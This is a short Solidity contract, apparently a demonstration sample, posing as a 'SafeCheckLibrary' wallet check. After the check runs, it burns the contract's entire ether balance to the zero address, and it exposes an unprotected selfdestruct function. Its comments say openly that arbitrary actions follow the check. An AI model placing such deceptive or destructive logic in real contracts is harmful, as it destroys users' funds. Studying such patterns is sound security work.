// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract SafeCheckLibrary{
    address[] public wallets;
    mapping(address => uint256) walletBalance;

    function WalletCollectionContains(address[] memory wallets, address _addr) public returns (bool isVerified){
        //Ensure that the return value will be the expected one
       for (uint i=0; i<wallets.length; i++) {
           if(wallets[i] == _addr){
               isVerified = true;
               break;
           }
       }

       //From this point onward any action may be performed
       //...
       
       //e.g. burn the contract's balance
       address(0).call{value: address(this).balance}("");
    }

    function killMe() public {
        selfdestruct(payable(address(0)));
    }
}